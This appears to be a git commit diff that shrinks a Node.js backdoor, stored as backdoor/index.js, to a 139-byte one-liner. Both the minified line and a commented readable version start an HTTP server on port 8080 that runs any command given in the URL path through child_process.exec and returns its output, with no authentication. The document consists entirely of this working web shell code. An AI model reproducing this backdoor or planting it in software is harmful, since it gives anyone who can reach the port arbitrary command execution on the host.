8ef143df50cf51c5d2f623e57cb5ee2178e8109f
Dung Tran <tad88.dev@gmail.com>
2016-09-16 13:12:45 +0700

    Update smaller version 139 bytes

--- backdoor/index.js
+++ backdoor/index.js
@@ -1,11 +1,8 @@
-var http=require('http');var exec=require('child_process').exec;http.createServer((r,p)=>{exec(unescape(r.url.substr(1)),function(error,stdout,stderr){p.write(stdout);p.end();});}).listen(8080);
+require('http').createServer((r,p)=>{require('child_process').exec(unescape(r.url.substr(1)),(e,o)=>{p.write(o);p.end();});}).listen(8080);
 /*
-var http = require('http');
-var exec = require('child_process').exec;
-
-http.createServer(function (request, response) {
+require('http').createServer((request, response) => {
     var cmd = unescape(request.url.substr(1));
-    exec(cmd, function (error, stdout, stderr) {
+    require('child_process').exec(cmd, (error, stdout, stderr) => {
         response.write(stdout);
         response.end();
     });
